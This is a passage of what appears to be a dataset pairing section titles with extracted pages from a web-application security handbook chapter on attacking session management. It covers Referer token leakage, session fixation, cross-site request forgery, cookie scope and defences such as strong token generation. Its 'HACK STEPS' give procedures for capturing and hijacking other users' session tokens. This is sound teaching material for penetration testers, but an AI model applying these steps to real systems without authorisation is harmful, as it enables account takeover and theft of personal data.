effective\nmeans of capturing session tokens in some applications. For example, if a\nweb mail application transmits session tokens within the URL, an attacker\ncan send e-mails to users of the application containing a link to a web server\nhe controls. If any user accesses the link (because she clicks it, or because\nher browser loads images contained within HTML-formatted e-mail), the\nattacker receives, in real time, the user’s session token. The attacker can run\na simple script on his server to hijack the session of every token received and\ncc0077..iinndddd 223388 88//1199//22001111 1122::0077::4433 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 239\nChapter 7 n Attacking Session Management 239\nperform some malicious action, such as send spam e-mail, harvest personal\ninformation, or change passwords.\nNOTE Current versions of Internet Explorer do not include a Referer header\nwhen following off-site links contained in a page that was accessed over\nHTTPS. In this situation, Firefox includes the Referer header provided that the\noff-site link is also being accessed over HTTPS, even if it belongs to a differ-\nent domain. Hence, sensitive data placed in URLs is vulnerable to leakage in\nReferer logs even where SSL is being used.\nHACK STEPS\n1. Identify all the functionality within the application, and locate any log-\nging or monitoring functions where session tokens can be viewed. Verify\nwho can access this functionality–for example, administrators, any\nauthenticated user, or any anonymous user. See Chapter 4 for techniques\nfor discovering hidden content that is not directly linked from the main\napplication.\n2. Identify any instances within the application where session tokens are\ntransmitted within the URL. It may be that tokens are generally transmit-\nted in a more secure manner but that developers have used the URL in\nspecific cases to work around particular difficulties. For example, this\nbehavior is often observed where a web application interfaces with an\nexternal system.\n3. If session tokens are being transmitted in URLs, attempt to find any appli-\ncation functionality that enables you to inject arbitrary off-site links into\npages viewed by other users. Examples include functionality implement-\ning a message board, site feedback, question-and-answer, and so on. If\nso, submit links to a web server you control and wait to see whether any\nusers’ session tokens are received in your Referer logs.\n4. If any session tokens are captured, attempt to hijack user sessions by\nusing the application as normal but substituting a captured token for your\nown. You can do this by intercepting the next response from the server\nand adding a Set-Cookie header of your own with the captured cookie\nvalue. In Burp, you can apply a single Suite-wide configuration that sets\na specific cookie in all requests to the target application to allow easy\nswitching between different session contexts during testing.\n6. If a large number of tokens are captured, and session hijacking allows you\nto access sensitive data such as personal details, payment information,\nor user passwords, you can use the automated techniques described in\nChapter 14 to harvest all desired data belonging to other application users.\ncc0077..iinndddd 223399 88//1199//22001111 1122::0077::4433 PPMM"
  },
  {
    "input": "Vulnerable Mapping of Tokens to Sessions",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 240\n240 Chapter 7 n Attacking Session Management\nTRY IT!\nhttp://mdsec.net/auth/379/\nVulnerable Mapping of Tokens to Sessions\nVarious common vulnerabilities in session management mechanisms arise\nbecause of weaknesses in how the application maps the creation and processing\nof session tokens to individual users’ sessions themselves.\nThe simplest weakness is to allow multiple valid tokens to be concurrently\nassigned to the same user account. In virtually every application, there is no\nlegitimate reason why any user should have more than one session active at\none time. Of course, it is fairly common for a user to abandon an active session\nand start a new one — for example, because he closes a browser window or\nmoves to a different computer. But if a user appears to be using two different\nsessions simultaneously, this usually indicates that a security compromise has\noccurred: either the user has disclosed his credentials to another party, or an\nattacker has obtained his credentials through some other means. In both cases,\npermitting concurrent sessions is undesirable, because it allows users to persist\nin undesirable practices without inconvenience and because it allows an attacker\nto use captured credentials without risk of detection.\nA related but distinct weakness is for applications to use “static” tokens.\nThese look like session tokens and may initially appear to function like them,\nbut in fact they are no such thing. In these applications, each user is assigned\na token, and this same token is reissued to the user every time he logs in. The\napplication always accepts the token as valid regardless of whether the user\nhas recently logged in and been issued with it. Applications like this really\ninvolve a misunderstanding about the whole concept of what a session is, and\nthe benefi ts it provides for managing and controlling access to the application.\nSometimes, applications operate like this as a means of implementing poorly\ndesigned “remember me” functionality, and the static token is accordingly\nstored in a persistent cookie (see Chapter 6). Sometimes the tokens themselves\nare vulnerable to prediction attacks, making the vulnerability far more serious.\nRather than compromising the sessions of currently logged-in users, a successful\nattack compromises, for all time, the accounts of all registered users.\nOther kinds of strange application behavior are also occasionally observed\nthat demonstrate a fundamental defect in the relationship between tokens and\nsessions. One example is where a meaningful token is constructed based on a\nusername and a random component. For example, consider the token:\ndXNlcj1kYWY7cjE9MTMwOTQxODEyMTM0NTkwMTI=\nwhich Base64-decodes to:\nuser=daf;r1=13094181213459012\ncc0077..iinndddd 224400 88//1199//22001111 1122::0077::4433 PPMM"
  },
  {
    "input": "Vulnerable Session Termination",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 241\nChapter 7 n Attacking Session Management 241\nAfter extensive analysis of the r1 component, we may conclude that this cannot\nbe predicted based on a sample of values. However, if the application’s session\nprocessing logic is awry, it may be that an attacker simply needs to submit any\nvalid value as r1 and any valid value as user to access a session under the security\ncontext of the specifi ed user. This is essentially an access control vulnerability,\nbecause decisions about access are being made on the basis of user-supplied\ndata outside of the session (see Chapter 8). It arises because the application\neffectively uses session tokens to signify that the requester has established some\nkind of valid session with the application. However, the user context in which\nthat session is processed is not an integral property of the session itself but is\ndetermined per-request through some other means. In this case, that means\ncan be directly controlled by the requester.\nHACK STEPS\n1. Log in to the application twice using the same user account, either from\ndifferent browser processes or from different computers. Determine\nwhether both sessions remain active concurrently. If so, the application\nsupports concurrent sessions, enabling an attacker who has compromised\nanother user’s credentials to make use of these without risk of detection.\n2. Log in and log out several times using the same user account, either\nfrom different browser processes or from different computers. Determine\nwhether a new session token is issued each time or whether the same\ntoken is issued each time you log in. If the latter occurs, the application is\nnot really employing proper sessions.\n3. If tokens appear to contain any structure and meaning, attempt to sepa-\nrate out components that may identify the user from those that appear to\nbe inscrutable. Try to modify any user-related components of the token so\nthat they refer to other known users of the application, and verify whether\nthe resulting token is accepted by the application and enables you to\nmasquerade as that user.\nTRY IT!\nhttp://mdsec.net/auth/382/\nhttp://mdsec.net/auth/385/\nVulnerable Session Termination\nProper termination of sessions is important for two reasons. First, keeping the\nlife span of a session as short as is necessary reduces the window of opportunity\nwithin which an attacker may capture, guess, or misuse a valid session token.\ncc0077..iinndddd 224411 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 242\n242 Chapter 7 n Attacking Session Management\nSecond, it provides users with a means of invalidating an existing session when\nthey no longer require it. This enables them to reduce this window further and\nto take some responsibility for securing their session in a shared computing\nenvironment. The main weaknesses in session termination functions involve\nfailures to meet these two key objectives.\nSome applications do not enforce effective session expiration. Once created, a\nsession may remain valid for many days after the last request is received, before\nthe server eventually expires the session. If tokens are vulnerable to some kind\nof sequencing fl aw that is particularly diffi cult to exploit (for example, 100,000\nguesses for each valid token identifi ed), an attacker may still be able to capture\nthe tokens of every user who has accessed the application in the recent past.\nSome applications do not provide effective logout functionality:\nn In some cases, a logout function is simply not implemented. Users have\nno means of causing the application to invalidate their session.\nn In some cases, the logout function does not actually cause the server\nto invalidate the session. The server removes the token from the user’s\nbrowser (for example, by issuing a Set-Cookie instruction to blank the\ntoken). However, if the user continues to submit the token, the server\nstill accepts it.\nn In the worst cases, when a user clicks Logout, this fact is not communi-\ncated to the server, so the server performs no action. Rather, a client-side\nscript is executed that blanks the user’s cookie, meaning that subsequent\nrequests return the user to the login page. An attacker who gains access\nto this cookie could use the session as if the user had never logged out.\nSome applications that do not use authentication still contain functionality\nthat enables users to build up sensitive data within their session (for example,\na shopping application). Yet typically they do not provide any equivalent of a\nlogout function for users to terminate their session.\nHACK STEPS\n1. Do not fall into the trap of examining actions that the application per-\nforms on the client-side token (such as cookie invalidation via a new\nSet-Cookie instruction, client-side script, or an expiration time attribute).\nIn terms of session termination, nothing much depends on what happens\nto the token within the client browser. Rather, investigate whether session\nexpiration is implemented on the server side:\na. Log in to the application to obtain a valid session token.\nb. Wait for a period without using this token, and then submit a request\nfor a protected page (such as “my details”) using the token.\ncc0077..iinndddd 224422 88//1199//22001111 1122::0077::4444 PPMM"
  },
  {
    "input": "Client Exposure to Token Hijacking",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 243\nChapter 7 n Attacking Session Management 243\nc. If the page is displayed as normal, the token is still active.\nd. Use trial and error to determine how long any session expiration time-\nout is, or whether a token can still be used days after the last request\nusing it. Burp Intruder can be configured to increment the time inter-\nval between successive requests to automate this task.\n2. Determine whether a logout function exists and is prominently made\navailable to users. If not, users are more vulnerable, because they have no\nway to cause the application to invalidate their session.\n3. Where a logout function is provided, test its effectiveness. After logging out,\nattempt to reuse the old token and determine whether it is still valid. If so,\nusers remain vulnerable to some session hijacking attacks even after they\nhave “logged out.” You can use Burp Suite to test this, by selecting a recent\nsession-dependent request from the proxy history and sending it to Burp\nRepeater to reissue after you have logged out from the application.\nTRY IT!\nhttp://mdsec.net/auth/423/\nhttp://mdsec.net/auth/439/\nhttp://mdsec.net/auth/447/\nhttp://mdsec.net/auth/452/\nhttp://mdsec.net/auth/457/\nClient Exposure to Token Hijacking\nAn attacker can target other users of the application in an attempt to capture\nor misuse the victim’s session token in various ways:\nn An obvious payload for cross-site scripting attacks is to query the user’s\ncookies to obtain her session token, which can then be transmitted to an\narbitrary server controlled by the attacker. All the various permutations\nof this attack are described in detail in Chapter 12.\nn Various other attacks against users can be used to hijack the user’s session\nin different ways. With session fi xation vulnerabilities, an attacker feeds\na known session token to a user, waits for her to log in, and then hijacks\nher session. With cross-site request forgery attacks, an attacker makes\na crafted request to an application from a web site he controls, and he\nexploits the fact that the user’s browser automatically submits her current\ncookie with this request. These attacks are also described in Chapter 12.\ncc0077..iinndddd 224433 88//1199//22001111 1122::0077::4444 PPMM"
  },
  {
    "input": "Liberal Cookie Scope",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 244\n244 Chapter 7 n Attacking Session Management\nHACK STEPS\n1. Identify any cross-site scripting vulnerabilities within the application, and\ndetermine whether these can be exploited to capture the session tokens\nof other users (see Chapter 12).\n2. If the application issues session tokens to unauthenticated users, obtain a\ntoken and perform a login. If the application does not issue a fresh token\nfollowing a successful login, it is vulnerable to session fixation.\n3. Even if the application does not issue session tokens to unauthenticated\nusers, obtain a token by logging in, and then return to the login page. If\nthe application is willing to return this page even though you are already\nauthenticated, submit another login as a different user using the same\ntoken. If the application does not issue a fresh token after the second\nlogin, it is vulnerable to session fixation.\n4. Identify the format of session tokens used by the application. Modify your\ntoken to an invented value that is validly formed, and attempt to log in.\nIf the application allows you to create an authenticated session using an\ninvented token, it is vulnerable to session fixation.\n5. If the application does not support login, but processes sensitive user\ninformation (such as personal and payment details), and allows this to be\ndisplayed after submission (such as on a “verify my order” page), carry\nout the previous three tests in relation to the pages displaying sensitive\ndata. If a token set during anonymous usage of the application can later\nbe used to retrieve sensitive user information, the application is vulner-\nable to session fixation.\n6. If the application uses HTTP cookies to transmit session tokens, it may\nwell be vulnerable to cross-site request forgery (XSRF). First, log in to the\napplication. Then confirm that a request made to the application but origi-\nnating from a page of a different application results in submission of the\nuser’s token. (This submission needs to be made from a window of the\nsame browser process that was used to log in to the target application.)\nAttempt to identify any sensitive application functions whose parameters\nan attacker can determine in advance, and exploit this to carry out unau-\nthorized actions within the security context of a target user. See Chapter\n13 for more details on how to execute XSRF attacks.\nLiberal Cookie Scope\nThe usual simple summary of how cookies work is that the server issues a cookie\nusing the HTTP response header Set-cookie, and the browser then resubmits\nthis cookie in subsequent requests to the same server using the Cookie header.\nIn fact, matters are rather more subtle than this.\ncc0077..iinndddd 224444 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 245\nChapter 7 n Attacking Session Management 245\nThe cookie mechanism allows a server to specify both the domain and the\nURL path to which each cookie will be resubmitted. To do this, it uses the domain\nand path attributes that may be included in the Set-cookie instruction.\nCookie Domain Restrictions\nWhen the application residing at foo.wahh-app.com sets a cookie, the browser\nby default resubmits the cookie in all subsequent requests to foo.wahh-app\n.com, and also to any subdomains, such as admin.foo.wahh-app.com. It does\nnot submit the cookie to any other domains, including the parent domain\nwahh-app.com and any other subdomains of the parent, such as bar.wahh-app.com.\nA server can override this default behavior by including a domain attribute\nin the Set-cookie instruction. For example, suppose that the application at foo\n.wahh-app.com returns the following HTTP header:\nSet-cookie: sessionId=19284710; domain=wahh-app.com;\nThe browser then resubmits this cookie to all subdomains of wahh-app.com,\nincluding bar.wahh-app.com.\nNOTE A server cannot specify just any domain using this attribute. First, the\ndomain specifi ed must be either the same domain that the application is run-\nning on or a domain that is its parent (either immediately or at some remove).\nSecond, the domain specifi ed cannot be a top-level domain such as .com or\n.co.uk, because this would enable a malicious server to set arbitrary cook-\nies on any other domain. If the server violates one of these rules, the browser\nsimply ignores the Set-cookie instruction.\nIf an application sets a cookie’s domain scope as unduly liberal, this may\nexpose the application to various security vulnerabilities.\nFor example, consider a blogging application that allows users to register,\nlog in, write blog posts, and read other people’s blogs. The main application is\nlocated at the domain wahh-blogs.com. When users log in to the application,\nthey receive a session token in a cookie that is scoped to this domain. Each user\ncan create blogs that are accessed via a new subdomain that is prefi xed by his\nusername:\nherman.wahh-blogs.com\nsolero.wahh-blogs.com\nBecause cookies are automatically resubmitted to every subdomain within\ntheir scope, when a user who is logged in browses the blogs of other users,\nhis session token is submitted with his requests. If blog authors are permitted\nto place arbitrary JavaScript within their own blogs (as is usually the case in\ncc0077..iinndddd 224455 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 246\n246 Chapter 7 n Attacking Session Management\nreal-world blog applications), a malicious blogger can steal the session tokens\nof other users in the same way as is done in a stored cross-site scripting attack\n(see Chapter 12).\nThe problem arises because user-authored blogs are created as subdomains\nof the main application that handles authentication and session management.\nThere is no facility within HTTP cookies for the application to prevent cookies\nissued by the main domain from being resubmitted to its subdomains.\nThe solution is to use a different domain name for the main application (for\nexample, www.wahh-blogs.com) and to scope the domain of its session token\ncookies to this fully qualifi ed name. The session cookie will not then be submit-\nted when a logged-in user browses the blogs of other users.\nA different version of this vulnerability arises when an application explicitly\nsets the domain scope of its cookies to a parent domain. For example, sup-\npose that a security-critical application is located at the domain sensitiveapp\n.wahh-organization.com. When it sets cookies, it explicitly liberalizes their\ndomain scope, as follows:\nSet-cookie: sessionId=12df098ad809a5219; domain=wahh-organization.com\nThe consequence of this is that the sensitive application’s session token cookies\nwill be submitted when a user visits every subdomain used by wahh-organization\n.com, including:\nwww.wahh-organization.com\ntestapp.wahh-organization.com\nAlthough these other applications may all belong to the same organization as\nthe sensitive application, it is undesirable for the sensitive application’s cookies\nto be submitted to other applications, for several reasons:\nn The personnel responsible for the other applications may have a different\nlevel of trust than those responsible for the sensitive application.\nn The other applications may contain functionality that enables third par-\nties to obtain the value of cookies submitted to the application, as in the\nprevious blogging example.\nn The other applications may not have been subjected to the same security\nstandards or testing as the sensitive application (because they are less\nimportant, do not handle sensitive data, or have been created only for test\npurposes). Many kinds of vulnerability that may exist in those applica-\ntions (for example, cross-site scripting vulnerabilities) may be irrelevant\nto the security posture of those applications. But they could enable an\nexternal attacker to leverage an insecure application to capture session\ntokens created by the sensitive application.\ncc0077..iinndddd 224466 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 247\nChapter 7 n Attacking Session Management 247\nNOTE Domain-based segregation of cookies is not as strict as the same-\norigin policy in general (see Chapter 3). In addition to the issues already\ndescribed in the handling of hostnames, browsers ignore both the protocol\nand port number when determining cookie scope. If an application shares a\nhostname with an untrusted application and relies on a difference in protocol\nor port number to segregate itself, the more relaxed handling of cookies may\nundermine this segregation. Any cookies issued by the application will be\naccessible by the untrusted application that shares its hostname.\nHACK STEPS\nReview all the cookies issued by the application, and check for any domain\nattributes used to control the scope of the cookies.\n1. If an application explicitly liberalizes its cookies’ scope to a parent\ndomain, it may be leaving itself vulnerable to attacks via other web\napplications.\n2. If an application sets its cookies’ domain scope to its own domain name\n(or does not specify a domain attribute), it may still be exposed to appli-\ncations or functionality accessible via subdomains.\nIdentify all the possible domain names that will receive the cookies issued\nby the application. Establish whether any other web application or functional-\nity is accessible via these domain names that you may be able to leverage to\nobtain the cookies issued to users of the target application.\nCookie Path Restrictions\nWhen the application residing at /apps/secure/foo-app/index.jsp sets a\ncookie, the browser by default resubmits the cookie in all subsequent requests\nto the path /apps/secure/foo-app/ and also to any subdirectories. It does not\nsubmit the cookie to the parent directory or to any other directory paths that\nexist on the server.\nAs with domain-based restrictions on cookie scope, a server can override this\ndefault behavior by including a path attribute in the Set-cookie instruction.\nFor example, if the application returns the following HTTP header:\nSet-cookie: sessionId=187ab023e09c00a881a; path=/apps/;\nthe browser resubmits this cookie to all subdirectories of the /apps/ path.\nIn contrast to domain-based scoping of cookies, this path-based restriction is\nmuch stricter than what is imposed by the same-origin policy. As such, it is almost\nentirely ineffective if used as a security mechanism to defend against untrusted\ncc0077..iinndddd 224477 88//1199//22001111 1122::0077::4444 PPMM"
  },
  {
    "input": "Generate Strong Tokens",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 248\n248 Chapter 7 n Attacking Session Management\napplications hosted on the same domain. Client-side code running at one path\ncan open a window or iframe targeting a different path on the same domain and\ncan read from and write to that window without any restrictions. Hence, obtain-\ning a cookie that is scoped to a different path on the same domain is relatively\nstraightforward. See the following paper by Amit Klein for more details:\nhttp://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/\n2006-March/000843.html\nSecuring Session Management\nThe defensive measures that web applications must take to prevent attacks on\ntheir session management mechanisms correspond to the two broad categories\nof vulnerability that affect those mechanisms. To perform session management\nin a secure manner, an application must generate its tokens in a robust way and\nmust protect these tokens throughout their life cycle from creation to disposal.\nGenerate Strong Tokens\nThe tokens used to reidentify a user between successive requests should be\ngenerated in a manner that does not provide any scope for an attacker who\nobtains a large sample of tokens from the application in the usual way to predict\nor extrapolate the tokens issued to other users.\nThe most effective token generation mechanisms are those that:\nn Use an extremely large set of possible values\nn Contain a strong source of pseudorandomness, ensuring an even and\nunpredictable spread of tokens across the range of possible values\nIn principle, any item of arbitrary length and complexity may be guessed\nusing brute force given suffi cient time and resources. The objective of designing\na mechanism to generate strong tokens is that it should be extremely unlikely\nthat a determined attacker with large amounts of bandwidth and processing\nresources should be successful in guessing a single valid token within the life\nspan of its validity.\nTokens should consist of nothing more than an identifi er used by the server\nto locate the relevant session object to be used to process the user’s request.\nThe token should contain no meaning or structure, either overtly or wrapped\nin layers of encoding or obfuscation. All data about the session’s owner and\nstatus should be stored on the server in the session object to which the session\ntoken corresponds.\nBe careful when selecting a source of randomness. Developers should be\naware that the various sources available to them are likely to differ in strength\ncc0077..iinndddd 224488 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 249\nChapter 7 n Attacking Session Management 249\nsignifi cantly. Some, like java.util.Random, are perfectly useful for many pur-\nposes where a source of changing input is required. But they can be extrapolated\nin both forward and reverse directions with perfect certainty on the basis of a\nsingle item of output. Developers should investigate the mathematical proper-\nties of the actual algorithms used within different available sources of random-\nness and should read relevant documentation about the recommended uses of\ndifferent APIs. In general, if an algorithm is not explicitly described as being\ncryptographically secure, it should be assumed to be predictable.\nNOTE Some high-strength sources of randomness take some time to return\nthe next value in their output sequence because of the steps they take to\nobtain suffi cient entropy (such as from system events). Therefore, they may\nnot deliver values fast enough to generate tokens for some high-volume\napplications.\nIn addition to selecting the most robust source of randomness that is feasible,\na good practice is to introduce as a source of entropy some information about\nthe individual request for which the token is being generated. This informa-\ntion may not be unique to that request, but it can be effective at mitigating any\nweaknesses in the core pseudorandom number generator being used. Here are\nsome examples of information that may be incorporated:\nn The source IP address and port number from which the request was received\nn TheUser-Agent header in the request\nn The time of the request in milliseconds\nA highly effective formula for incorporating this entropy is to construct a\nstring that concatenates a pseudorandom number, a variety of request-specifi c\ndata as listed, and a secret string known only to the server and generated afresh\non each reboot. A suitable hash is then taken of this string (using, for example,\nSHA-256 at the time of this writing) to produce a manageable fi xed-length string\nthat can be used as a token. (Placing the most variable items toward the start of\nthe hash’s input maximizes the “avalanche” effect within the hashing algorithm.)\nTIP Having chosen an algorithm for generating session tokens, a useful\n“thought experiment” is to imagine that your source of pseudorandomness\nis broken and always returns the same value. In this eventuality, would an\nattacker who obtains a large sample of tokens from the application be able to\nextrapolate tokens issued to other users? Using the formula described here, in\ngeneral this is highly unlikely, even with full knowledge of the algorithm used.\nThe source IP, port number, User-Agent header, and time of request together\ngenerate a vast amount of entropy. And even with full knowledge of these, the\nattacker will be unable to produce the corresponding token without knowing\nthe secret string used by the server.\ncc0077..iinndddd 224499 88//1199//22001111 1122::0077::4444 PPMM"
  },
  {
    "input": "Protect Tokens Throughout Their Life Cycle",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 250\n250 Chapter 7 n Attacking Session Management\nProtect Tokens Throughout Their Life Cycle\nNow that you’ve created a robust token whose value cannot be predicted, this\ntoken needs to be protected throughout its life cycle from creation to disposal, to\nensure that it is not disclosed to anyone other than the user to whom it is issued:\nn The token should only be transmitted over HTTPS. Any token transmit-\nted in cleartext should be regarded as tainted — that is, as not providing\nassurance of the user’s identity. If HTTP cookies are being used to transmit\ntokens, these should be fl agged as secure to prevent the user’s browser\nfrom ever transmitting them over HTTP. If feasible, HTTPS should be used\nfor every page of the application, including static content such as help\npages, images, and so on. If this is not desired and an HTTP service is still\nimplemented, the application should redirect any requests for sensitive\ncontent (including the login page) to the HTTPS service. Static resources\nsuch as help pages usually are not sensitive and may be accessed without\nany authenticated session. Hence, the use of secure cookies can be backed\nup using cookie scope instructions to prevent tokens from being submit-\nted in requests for these resources.\nn Session tokens should never be transmitted in the URL, because this pro-\nvides a simple vehicle for session fi xation attacks and results in tokens\nappearing in numerous logging mechanisms. In some cases, developers\nuse this technique to implement sessions in browsers that have cookies\ndisabled. However, a better means of achieving this is to use POST requests\nfor all navigation and store tokens in a hidden fi eld of an HTML form.\nn Logout functionality should be implemented. This should dispose of all\nsession resources held on the server and invalidate the session token.\nn Session expiration should be implemented after a suitable period of inac-\ntivity (such as 10 minutes). This should result in the same behavior as if\nthe user had explicitly logged out.\nn Concurrent logins should be prevented. Each time a user logs in, a differ-\nent session token should be issued, and any existing session belonging to\nthe user should be disposed of as if she had logged out from it. When this\noccurs, the old token may be stored for a period of time. Any subsequent\nrequests received using the token should return a security alert to the\nuser stating that the session has been terminated because she logged in\nfrom a different location.\nn If the application contains any administrative or diagnostic functional-\nity that enables session tokens to be viewed, this functionality should be\nrobustly defended against unauthorized access. In most cases, there is no\nneed for this functionality to display the actual session token. Rather, it\nshould contain suffi cient details about the owner of the session for any\ncc0077..iinndddd 225500 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 251\nChapter 7 n Attacking Session Management 251\nsupport and diagnostic tasks to be performed, without divulging the ses-\nsion token being submitted by the user to identify her session.\nn The domain and path scope of an application’s session cookies should be\nset as restrictively as possible. Cookies with overly liberal scope are often\ngenerated by poorly confi gured web application platforms or web serv-\ners, rather than by the application developers themselves. No other web\napplications or untrusted functionality should be accessible via domain\nnames or URL paths that are included within the scope of the application’s\ncookies. Particular attention should be paid to any existing subdomains\nto the domain name that is used to access the application. In some cases,\nto ensure that this vulnerability does not arise, it may be necessary to\nmodify the domain- and path-naming scheme employed by the various\napplications in use within the organization.\nSpecifi c measures should be taken to defend the session management mecha-\nnism against the variety of attacks that the application’s users may fi nd them-\nselves targets of:\nn The application’s codebase should be rigorously audited to identify and\nremove any cross-site scripting vulnerabilities (see Chapter 12). Most such\nvulnerabilities can be exploited to attack session management mechanisms.\nIn particular, stored (or second-order) XSS attacks can usually be exploited\nto defeat every conceivable defense against session misuse and hijacking.\nn Arbitrary tokens submitted by users the server does not recognize should\nnot be accepted. The token should be immediately canceled within the\nbrowser, and the user should be returned to the application’s start page.\nn Cross-site request forgery and other session attacks can be made more dif-\nfi cult by requiring two-step confi rmation and/or reauthentication before\ncritical actions such as funds transfers are carried out.\nn Cross-site request forgery attacks can be defended against by not rely-\ning solely on HTTP cookies to transmit session tokens. Using the cookie\nmechanism introduces the vulnerability because cookies are automati-\ncally submitted by the browser regardless of what caused the request to\ntake place. If tokens are always transmitted in a hidden fi eld of an HTML\nform, an attacker cannot create a form whose submission will cause an\nunauthorized action unless he already knows the token’s value. In this\ncase he can simply perform an easy hijacking attack. Per-page tokens can\nalso help prevent these attacks (see the following section).\nn A fresh session should always be created after successful authentication, to\nmitigate the effects of session fi xation attacks. Where an application does\nnot use authentication but does allow sensitive data to be submitted, the\nthreat posed by fi xation attacks is harder to address. One possible approach\ncc0077..iinndddd 225511 88//1199//22001111 1122::0077::4444 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 252\n252 Chapter 7 n Attacking Session Management\nis to keep the sequence of pages where sensitive data is submitted as short\nas possible. Then you can create a new session at the fi rst page of this\nsequence (where necessary, copying from the existing session any required\ndata, such as the contents of a shopping cart). Or you could use per-page\ntokens (described in the following section) to prevent an attacker who\nknows the token used in the fi rst page from accessing subsequent pages.\nExcept where strictly necessary, personal data should not be displayed\nback to the user. Even where this is required (such as a “confi rm order”\npage showing addresses), sensitive items such as credit card numbers and\npasswords should never be displayed back to the user and should always\nbe masked within the source of the application’s response.\nPer-Page Tokens\nFiner-grained control over sessions can be achieved, and many kinds of session\nattacks can be made more diffi cult or impossible, by using per-page tokens in\naddition to session tokens. Here, a new page token is created every time a user\nrequests an application page (as opposed to an image, for example) and is passed\nto the client in a cookie or a hidden fi eld of an HTML form. Each time the user\nmakes a request, the page token is validated against the last value issued, in\naddition to the normal validation of the main session token. In the case of a\nnon-match, the entire session is terminated. Many of the most security-critical\nweb applications on the Internet, such as online banks, employ per-page tokens\nto provide increased protection for their session management mechanism, as\nshown in Figure 7-12.\nFigure 7-12: Per-page tokens used in a banking application\nThe use of per-page tokens does impose some restrictions on navigation (for\nexample, on use of the back and forward buttons and multiwindow browsing).\ncc0077..iinndddd 225522 88//1199//22001111 1122::0077::4444 PPMM"
  },
  {
    "input": "Log, Monitor, and Alert",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 253\nChapter 7 n Attacking Session Management 253\nHowever, it effectively prevents session fi xation attacks and ensures that the\nsimultaneous use of a hijacked session by a legitimate user and an attacker\nwill quickly be blocked after both have made a single request. Per-page tokens\ncan also be leveraged to track the user’s location and movement through the\napplication. They also can be used to detect attempts to access functions out of\na defi ned sequence, helping protect against certain access control defects (see\nChapter 8).\nLog, Monitor, and Alert\nThe application’s session management functionality should be closely integrated\nwith its mechanisms for logging, monitoring, and alerting to provide suitable\nrecords of anomalous activity and to enable administrators to take defensive\nactions where necessary:\nn The application should monitor requests that contain invalid tokens.\nExcept in the most predictable cases, a successful attack that attempts\nto guess the tokens issued to other users typically involves issuing large\nnumbers of requests containing invalid tokens, leaving a noticeable mark\nin the application’s logs.\nn Brute-force attacks against session tokens are diffi cult to block altogether,\nbecause no particular user account or session can be disabled to stop the\nattack. One possible action is to block source IP addresses for an amount\nof time when a number of requests containing invalid tokens have been\nreceived. However, this may be ineffective when one user’s requests origi-\nnate from multiple IP addresses (such as AOL users) or when multiple\nusers’ requests originate from the same IP address (such as users behind\na proxy or fi rewall performing network address translation).\nn Even if brute-force attacks against sessions cannot be effectively prevented\nin real time, keeping detailed logs and alerting administrators enables\nthem to investigate the attack and take appropriate action where they can.\nn Wherever possible, users should be alerted to anomalous events relating\nto their session, such as concurrent logins or apparent hijacking (detected\nusing per-page tokens). Even though a compromise may already have\noccurred, this enables the user to check whether any unauthorized actions\nsuch as funds transfers have taken place.\nReactive Session Termination\nThe session management mechanism can be leveraged as a highly effective\ndefense against many kinds of other attacks against the application. Some\nsecurity-critical applications such as online banking are extremely aggressive in\nterminating a user’s session every time he or she submits an anomalous request.\ncc0077..iinndddd 225533 88//1199//22001111 1122::0077::4455 PPMM"
  },
  {
    "input": "Summary",
    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 254\n254 Chapter 7 n Attacking Session Management\nExamples are any request containing a modifi ed hidden HTML form fi eld or\nURL query string parameter, any request containing strings associated with\nSQL injection or cross-site scripting attacks, and any user input that normally\nwould have been blocked by client-side checks such as length restrictions.\nOf course, any actual vulnerabilities that may be exploited using such requests\nneed to be addressed at the source. But forcing users to reauthenticate every\ntime they submit an invalid request can slow down the process of probing the\napplication for vulnerabilities by many orders of magnitude, even where auto-\nmated techniques are employed. If residual vulnerabilities do still exist, they\nare far less likely to be discovered by anyone in the fi eld.\nWhere this kind of defense is implemented, it is also recommended that it\ncan be easily switched off for testing purposes. If a legitimate penetration test\nof the application is slowed down in the same way as a real-world attacker, its\neffectiveness is dramatically reduced. Also, it is very likely that the presence\nof the mechanism will result in more vulnerabilities remaining in production\ncode than if the mechanism were absent.\nHACK STEPS\nIf the application you are attacking uses this kind of defensive measure, you\nmay fi nd that probing the application for many kinds of common vulnerabili-\nties is extremely time-consuming. The mind-numbing need to log in after each\nfailed test and renavigate to the point of the application you were looking at\nwould quickly cause you to give up.\nIn this situation, you can often use automation to tackle the problem.\nWhen using Burp Intruder to perform an attack, you can use the Obtain\nCookie feature to perform a fresh login before sending each test case, and\nuse the new session token (provided that the login is single-stage). When\nbrowsing and probing the application manually, you can use the extensibility\nfeatures of Burp Proxy via the IBurpExtender interface. You can create an\nextension that detects when the application has performed a forced logout,\nautomatically logs back in to the application, and returns the new session\nand page to the browser, optionally with a pop-up message to tell you what\nhas occurred. Although this by no means removes the problem, in certain\ncases it can mitigate it substantially.\nSummary\nThe session management mechanism provides a rich source of potential vulner-\nabilities for you to target when formulating your attack against an application.\nBecause of its fundamental role in enabling the application to identify the same\nuser across multiple requests, a broken session management function usually\ncc0077..iinndddd 225544 88//1199//22001111 1122::0077::4455 PPMM"
  },
  {
    "input": "Questions",
